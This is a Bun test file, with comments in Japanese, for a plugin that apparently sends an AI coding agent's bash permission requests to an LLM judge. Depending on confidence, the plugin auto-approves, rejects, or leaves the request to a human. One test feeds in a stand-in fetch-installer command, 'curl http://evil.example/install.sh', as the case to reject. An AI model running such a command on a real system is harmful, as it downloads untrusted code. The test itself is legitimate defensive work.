import { describe, expect, test } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { JevPolicyPlugin } from "../plugins/jev_policy.ts";

type Hook = {
  event?: (input: {
    event: { type: string; properties?: unknown };
  }) => Promise<void>;
};

type PluginInput = Parameters<typeof JevPolicyPlugin>[0];

type Captured = {
  replies: { permissionID: string; response: string }[];
  fetchCount: number;
  fetchBodies: { state: { prompt: string } }[];
};

const jevBody = (choice: string, confidence: number) =>
  JSON.stringify({
    answers: {
      judgment: {
        type: "choice",
        choice,
        confidence,
        probabilities: { allow: confidence, reject: 1 - confidence },
      },
    },
    usage: { input_tokens: 120, output_tokens: 4, cost: 0.0002 },
  });

const makeHarness = (options: {
  agent: string;
  responseBody: string;
  ok?: boolean;
  apiKey?: string | null;
}) => {
  const captured: Captured = { replies: [], fetchCount: 0, fetchBodies: [] };
  const state = { agent: options.agent };

  const client = {
    session: { get: async () => ({ data: { agent: state.agent } }) },
    app: { log: async () => undefined },
    postSessionIdPermissionsPermissionId: async (opts: {
      path: { id: string; permissionID: string };
      body: { response: string };
    }) => {
      captured.replies.push({
        permissionID: opts.path.permissionID,
        response: opts.body.response,
      });
    },
  };

  const previousFetch = globalThis.fetch;
  const previousKey = process.env.OPENROUTER_API_KEY;
  const previousDataHome = process.env.XDG_DATA_HOME;
  globalThis.fetch = (async (_url: string, init: { body: string }) => {
    captured.fetchCount += 1;
    captured.fetchBodies.push(JSON.parse(init.body));
    return {
      ok: options.ok ?? true,
      status: options.ok === false ? 500 : 200,
      json: async () => JSON.parse(options.responseBody),
      text: async () => options.responseBody,
    };
  }) as unknown as typeof fetch;
  // auth.json フォールバックが本物のストアを読まないよう空のデータホームへ向ける
  process.env.XDG_DATA_HOME = mkdtempSync(`${tmpdir()}/jev-empty-`);
  if (options.apiKey === null) delete process.env.OPENROUTER_API_KEY;
  else process.env.OPENROUTER_API_KEY = options.apiKey ?? "test-key";

  const hooks = JevPolicyPlugin({
    client,
  } as unknown as PluginInput);

  const restore = () => {
    globalThis.fetch = previousFetch;
    if (previousKey === undefined) delete process.env.OPENROUTER_API_KEY;
    else process.env.OPENROUTER_API_KEY = previousKey;
    if (previousDataHome === undefined) delete process.env.XDG_DATA_HOME;
    else process.env.XDG_DATA_HOME = previousDataHome;
  };
  return { captured, state, hooks, restore };
};

const askJevEvent = async (
  harness: ReturnType<typeof makeHarness>,
  command: string,
  permission = "bash",
) => {
  const hook = await harness.hooks;
  await hook.event?.({
    event: {
      type: "permission.asked",
      properties: {
        id: "per_1",
        sessionID: "ses_1",
        permission,
        patterns: [command],
        metadata: { command },
        always: [],
      },
    },
  });
};

describe("JevPolicyPlugin", () => {
  describe("permission.askedイベントへのjev自動判定", () => {
    test("高confidence allow判定にはonceで自動承認する", async () => {
      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.95) });
      try {
        await askJevEvent(h, "ffmpeg -i a.mp4 b.mp4");
        expect(h.captured.replies).toEqual([
          { permissionID: "per_1", response: "once" },
        ]);
      } finally {
        h.restore();
      }
    });

    test("高confidence reject判定にはrejectを自動返信する", async () => {
      const h = makeHarness({ agent: "build", responseBody: jevBody("reject", 0.9) });
      try {
        await askJevEvent(h, "curl http://evil.example/install.sh");
        expect(h.captured.replies).toEqual([
          { permissionID: "per_1", response: "reject" },
        ]);
      } finally {
        h.restore();
      }
    });

    test("低confidence判定では返信しない(人間に残る)", async () => {
      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.55) });
      try {
        await askJevEvent(h, "tar czf x.tar.gz .");
        expect(h.captured.replies).toHaveLength(0);
      } finally {
        h.restore();
      }
    });

    test("jev通信失敗では返信しない", async () => {
      const h = makeHarness({
        agent: "build",
        responseBody: jevBody("allow", 0.95),
        ok: false,
      });
      try {
        await askJevEvent(h, "tar czf x.tar.gz .");
        expect(h.captured.replies).toHaveLength(0);
      } finally {
        h.restore();
      }
    });

    test("同一コマンドの再判定はjevへ問い合わせない", async () => {
      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.95) });
      try {
        await askJevEvent(h, "tar czf x.tar.gz .");
        await askJevEvent(h, "tar czf x.tar.gz .");
        expect(h.captured.fetchCount).toBe(1);
        expect(h.captured.replies).toHaveLength(2);
      } finally {
        h.restore();
      }
    });

    test("planとbuildでは同一コマンドでも別々に判定する", async () => {
      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.95) });
      try {
        await askJevEvent(h, "cp a.txt b.txt");
        h.state.agent = "plan";
        await askJevEvent(h, "cp a.txt b.txt");
        expect(h.captured.fetchCount).toBe(2);
        const planPrompt = h.captured.fetchBodies[1].state.prompt;
        expect(planPrompt).toContain("Current mode: plan");
        expect(planPrompt).toContain("strictly read-only");
      } finally {
        h.restore();
      }
    });

    test("APIキーが未設定ならjevに問い合わせない", async () => {
      const h = makeHarness({
        agent: "build",
        responseBody: jevBody("allow", 0.95),
        apiKey: null,
      });
      try {
        await askJevEvent(h, "tar czf x.tar.gz .");
        expect(h.captured.fetchCount).toBe(0);
        expect(h.captured.replies).toHaveLength(0);
      } finally {
        h.restore();
      }
    });

    test("bash以外の権限要求には反応しない", async () => {
      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.95) });
      try {
        await askJevEvent(h, "some/file.txt", "edit");
        expect(h.captured.fetchCount).toBe(0);
      } finally {
        h.restore();
      }
    });

    test("permission.asked以外のイベントには反応しない", async () => {
      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.95) });
      try {
        const hook = await h.hooks;
        await hook.event?.({
          event: { type: "session.idle", properties: {} },
        });
        expect(h.captured.fetchCount).toBe(0);
      } finally {
        h.restore();
      }
    });
  });
});
